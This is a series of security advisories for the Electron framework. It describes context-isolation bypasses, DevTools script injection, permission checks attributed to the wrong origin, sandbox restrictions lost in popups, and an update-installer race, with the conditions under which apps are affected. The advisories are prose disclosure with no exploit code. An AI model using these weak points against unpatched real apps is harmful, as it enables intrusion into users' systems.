Apps that expose Promise-returning functions to web content via `contextBridge` may be vulnerable to a context isolation bypass. Untrusted web content could obtain access to the isolated preload world and, through it, every capability the preload script has. In renderers without a sandbox, or with `nodeIntegration` enabled, this may escalate to Node.js access.

Apps are affected if they expose Promise-returning functions via `contextBridge` — the standard pattern for wrapping `ipcRenderer.invoke` — in windows that load untrusted content. Apps that never load untrusted content in those windows are not affected.

title: DevTools embedder handler executes arbitrary files via shell open
description:
The DevTools "reveal in file manager" action could launch the target file rather than reveal it. An attacker with a separate means of running script inside the DevTools frontend (such as a malicious DevTools extension) could use this to execute native code outside the sandbox.

Apps are only affected if DevTools is opened for windows exposed to untrusted content or untrusted DevTools extensions. Apps that do not open DevTools in that context are not affected.

title: Extension tab APIs operate across session boundaries
description:
Extension tab and scripting APIs were not scoped to the extension's own `session`. A malicious or compromised extension loaded into one session could navigate, script, and read from windows belonging to a different session.

Apps are only affected if they load Chrome extensions via `session.loadExtension` and rely on separate sessions to isolate that extension from other content. Apps that do not load extensions, or that use a single session, are not affected.

title: Parent process code-sign check is spoofable
description:
On macOS, the check Electron uses to confirm it was launched by a same-signed parent process could be bypassed by a local process. Apps that enable the fuse-based hardening restricting `ELECTRON_RUN_AS_NODE` and `NODE_OPTIONS` to same-signed parents rely on this check; a local attacker could bypass it and run their own code inside the signed app, inheriting its TCC permissions and keychain access.

Apps are only affected if they enable those macOS fuse-based restrictions. Apps that do not enable them are not affected.

title: Permission Check Handler Receives Main Frame Origin Instead of Requesting Iframe Origin
description:
For serial-port and media (camera / microphone) permission checks made from an iframe, the `requestingOrigin` passed to `session.setPermissionCheckHandler` was the top-level frame's origin rather than the requesting frame's. Origin-based handler logic could therefore grant a cross-origin iframe device access intended only for the top-level origin.

Apps are only affected if they use `setPermissionCheckHandler` with origin-based logic and embed cross-origin iframes with delegated device permissions. Apps that base the decision on `details.securityOrigin`, or that do not embed such iframes, are not affected.

title: HTTP redirect followed into local file loader
description:
When following HTTP redirects, `net.fetch()` and `net.request()` did not restrict which schemes a redirect could target. A remote server could redirect a request to a local resource, and if the app returns or forwards the response body, local file contents could be disclosed.

Apps are only affected if they make `net` requests to attacker-influenced URLs with redirects followed (the default) and expose the response body. Apps that only request fixed, trusted URLs are not affected.

title: DevTools JavaScript Injection via Unsanitized Dock State Parameter
description:
The `mode` option of `webContents.openDevTools()` was not sanitized before use by the DevTools frontend. If an attacker can influence this value, script under their control may run in the DevTools context, which in unsandboxed configurations has access to Node.js.

Apps are only affected if untrusted input can reach the `mode` argument of `openDevTools()`, or if untrusted content can call `openDevTools()` on a `<webview>` it embeds. Apps that only ever pass a fixed dock mode are not affected.

title: Sandboxed iframes can launch external protocol handlers
description:
Requests to open external protocol URLs from web content did not take iframe sandbox restrictions into account, so a sandboxed iframe could cause an OS-registered external application to be launched. The frame's sandbox state was also not made available to the app's permission handlers.

Apps are only affected if they render untrusted content in sandboxed iframes and grant the `openExternal` permission (granted by default when no `setPermissionRequestHandler` is installed). Apps whose permission handler denies `openExternal` for untrusted content are not affected.

title: contextBridge object copy incorrectly honours setters on prototype
description:
Objects copied across the `contextBridge` boundary from untrusted content could carry an attacker-influenced prototype, enabling prototype-pollution-style attacks against preload code despite context isolation being enabled.

Apps are only affected if their preload code accepts object arguments from untrusted content and reads properties from them without own-property checks. Apps that only accept primitive arguments, or that validate object arguments, are not affected.

title: window.open features string controls some window options considered privileged
description:
Some window options supplied by web content in the `window.open()` features string were applied to the new `BrowserWindow` without an allowlist. Untrusted content could set window options it should not control, including options that cause the main process to access attacker-chosen file or network paths.

Apps are only affected if untrusted content can call `window.open()` and the app does not override child window options via `setWindowOpenHandler`. Apps that deny `window.open()` for untrusted content, or set `overrideBrowserWindowOptions` explicitly, are not affected.

title: Off-screen rendering trusts GPU-supplied geometry over shared-memory size
description:
In offscreen rendering mode, frame data received from the GPU process was not fully validated by the main process. A compromised GPU process could cause the main process to read out-of-bounds memory while producing `paint` event images, disclosing memory or crashing the app.

Apps are only affected if they use offscreen rendering (`webPreferences.offscreen`) and an attacker has separately gained code execution in the GPU process. Apps that do not use offscreen rendering are not affected.

title: Cross-origin iframe can position native autofill popup
description:
The native autofill popup could be positioned by a cross-origin iframe outside that iframe's bounds, over the embedding page's UI, enabling clickjacking or spoofing of trusted UI.

Apps are only affected if they embed untrusted content in iframes within windows that also display trusted UI. Apps that do not embed untrusted third-party content are not affected.

title: Sandboxed preload code cache can be poisoned by a compromised renderer
description:
The cache Electron keeps for sandboxed preload scripts did not verify that a cached entry matched the preload it was served for. A compromised renderer could use this to run its own code in the preload context on a later load.

Apps are only affected if they load untrusted content. Apps that do not load untrusted content are not affected.

title: <webview> can enable Node.js integration in Web Workers despite embedder restrictions
description:
A `<webview>` could enable Node.js integration in its Web Workers even when its embedder had Node.js integration disabled, giving guest content more privilege than the embedder allowed.

Apps are only affected if they enable the `<webview>` tag and the embedder is unsandboxed. Apps that do not use `<webview>`, or that keep the embedder sandboxed, are not affected.

title: File and HTTP protocol handlers allow cross-origin reads without corsEnabled
description:
Responses served through `protocol.registerFileProtocol` or `protocol.registerHttpProtocol` for a custom scheme registered with `supportFetchAPI: true` but without `corsEnabled: true` could be read cross-origin by web content. This completes the fix for CVE-2026-70604.

Apps are only affected if they register such a scheme, serve it through one of those handlers, and load untrusted content in the same session. Apps that do not load untrusted content are not affected. Schemes registered with `corsEnabled: true` are unchanged by this fix: that option opts the scheme in to cross-origin `fetch()`, and responses from its handler are readable by any origin in the session by design.

title: Windows opened from a sandboxed top-level document do not inherit its sandbox restrictions
description:
Windows opened from a sandboxed top-level document did not inherit that document's HTML `sandbox` restrictions, so content that was meant to run sandboxed could open a window with the app's full origin. GHSA-hq2x-r82h-9wj4 covers the same issue for sandboxed iframes.

Apps are only affected if they render untrusted content in a sandboxed top-level document that allows popups. Apps that deny popups from untrusted content with `setWindowOpenHandler` are not affected.

title: Electron drops inherited HTML sandbox restrictions for popups opened through OpenURLFromTab
description:
Popups opened from a sandboxed iframe through a link (for example `target="_blank"` or a middle-click) did not inherit the iframe's HTML `sandbox` restrictions. Content that was meant to run sandboxed could open a popup with the embedding app's full origin, gaining access to that origin's cookies, storage, and same-origin scripting.

Apps are only affected if they embed untrusted content in iframes sandboxed with `allow-scripts allow-popups`. Apps that do not embed untrusted content in sandboxed iframes are not affected.

title: Local race condition in Squirrel.Mac update installation on macOS
description:
On macOS, Electron bundles the Squirrel.Mac auto-update framework, whose privileged `ShipIt` helper performs the final step of an update as root. A local attacker could cause that helper to overwrite a different application's files, as root, instead of the app that started the update. Exploitation requires local access to the machine.

Apps are only affected on macOS if they ship Squirrel.Mac-based auto-updates. Apps on other platforms, or that do not use Squirrel.Mac auto-updates, are not affected.

No patched version was released for the 40.x line (`>= 40.0.0-alpha.1`); upgrade to a fixed major.

title: HID and USB permission checks can be attributed to the wrong origin
description:
For `hid` and `usb` permission checks made from an iframe, `session.setPermissionCheckHandler` was given the top-level frame's origin and details instead of the requesting frame's. Apps that allow these permissions based on origin could grant an embedded frame access intended for the top-level page.

You're only affected if you use `setPermissionCheckHandler` with origin-based logic for `hid` or `usb` and embed cross-origin iframes with `allow="hid"` or `allow="usb"`. Apps that don't delegate those features to untrusted iframes are not affected.

title: openExternal permission requests can be attributed to the wrong origin
description:
Requests to open external protocol URLs could be attributed to a document other than the one that asked for them, so the `requestingUrl` passed to `session.setPermissionRequestHandler` was a trusted origin for a launch untrusted content had requested. An origin-based handler could therefore let untrusted content launch an OS-registered external application.

Apps are only affected if they grant `openExternal` based on the requesting origin and let untrusted content open or navigate windows. Apps whose permission handler denies `openExternal` for untrusted content are not affected.

title: Off-screen rendering on macOS trusts GPU-supplied frame geometry
description:
In offscreen rendering mode on macOS, frame data received from the GPU process was not fully validated by the main process. A compromised GPU process could cause the main process to read out-of-bounds memory while producing `paint` event images, disclosing memory or crashing the app. GHSA-pfmc-3mgc-p6fp covers the same issue on the other capture paths.

Apps are only affected if they use offscreen rendering (`webPreferences.offscreen`) on macOS and an attacker has separately gained code execution in the GPU process. Apps that do not use offscreen rendering are not affected.

title: Frame subscription trusts GPU-supplied frame geometry
description:
Frame data received from the GPU process for `webContents.beginFrameSubscription` was not fully validated by the main process. A compromised GPU process could cause the main process to read out-of-bounds memory while producing the captured frame images, disclosing memory or crashing the app.

Apps are only affected if they use `webContents.beginFrameSubscription` and an attacker has separately gained code execution in the GPU process. Apps that do not subscribe to captured frames are not affected.

title: Pointer lock permission requests can be attributed to the wrong frame
description:
For `pointerLock` permission requests made from some cross-origin iframes, `session.setPermissionRequestHandler()` was given the top-level frame's `requestingUrl` and `isMainFrame` instead of the requesting frame's. Apps that grant pointer lock based on the requesting origin could grant it to embedded content under the top-level page's identity.

Apps are only affected if they embed untrusted content in iframes and decide `pointerLock` requests by origin in `setPermissionRequestHandler`. Apps that do not embed untrusted content, or that deny `pointerLock` for it, are not affected.

title: Extension tabs.query returns tab URLs and titles without the tabs permission
description:
`chrome.tabs.query()` returned each tab's `url` and `title` to extensions that held neither the `tabs` permission nor matching host permissions, so any loaded extension could read the URL and title of every webContents in its session.

Apps are only affected if they load extensions (`session.extensions.loadExtension`) that they do not fully trust. Apps that load no extensions, or only trusted ones, are not affected.

title: Out-of-package denial-of-service for CommonJS Electron apps packaged with ASAR
description:
A CommonJS app packaged in an ASAR archive could be prevented from launching by a `package.json` in a directory above the app, for example one that is malformed or declares `"type": "module"`. Because that file is outside the app's own package, a local user able to write to an ancestor directory of the install location could stop the app from starting.

Apps are only affected on Electron 35 and 36 if their main-process entry point is CommonJS and packaged in an ASAR archive. Apps whose entry point is an ES module are not affected.

title: SameSite cookie restrictions are not applied to windows opened from links
description:
Pages opened into a new window from a link were loaded as if the app itself had navigated there rather than the page that contained the link, so the request was treated as same-site: `SameSite=Strict` cookies were sent and `Sec-Fetch-Site` did not identify the initiating page. Content shown in the app could use this to make a credentialed top-level request to another site that relies on SameSite cookies as a CSRF defence.

Apps are only affected if they load untrusted content and allow it to open new windows. Apps that deny new windows from untrusted content with `setWindowOpenHandler` are not affected.

title: Mitigation for compromised eMudhra intermediate certificates
description:
A set of eMudhra intermediate certificates were compromised and are being blocked by browsers and other TLS clients. This Electron update adds the same block to both Chromium networking and Node.js `tls`, `https` and `fetch`. On earlier versions, an attacker holding a certificate issued through these intermediates and able to intercept network traffic could impersonate a TLS server to an app.

Apps are only affected if they make TLS connections over a network an attacker can intercept. Apps that make no network connections are not affected.

Other software has shipped the same mitigation, including Go (CVE-2026-111943) and Firefox (CVE-2026-113470).
